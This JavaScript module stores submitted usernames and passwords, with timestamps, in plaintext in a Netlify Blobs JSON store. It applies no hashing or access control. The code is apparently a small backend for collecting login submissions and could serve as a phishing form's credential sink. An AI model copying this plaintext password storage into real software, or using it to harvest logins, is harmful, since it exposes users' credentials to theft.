import { getStore } from "@netlify/blobs";

const BLOB_STORE = "submissions-db";
const BLOB_KEY = "submissions.json";

function getBlobStore() {
  return getStore(BLOB_STORE);
}

export async function getSubmissions() {
  try {
    const store = getBlobStore();
    const submissions = await store.get(BLOB_KEY, { type: "json" });
    return Array.isArray(submissions) ? submissions : [];
  } catch (error) {
    console.error("Failed to read from Netlify Blobs:", error);
    return [];
  }
}

export async function addSubmission(username, password) {
  const store = getBlobStore();
  const submissions = await getSubmissions();
  
  const newSubmission = { 
    username: String(username ?? ""), 
    password: String(password ?? ""),
    timestamp: new Date().toISOString()
  };
  
  submissions.push(newSubmission);
  
  await store.setJSON(BLOB_KEY, submissions);
  
  return newSubmission;
}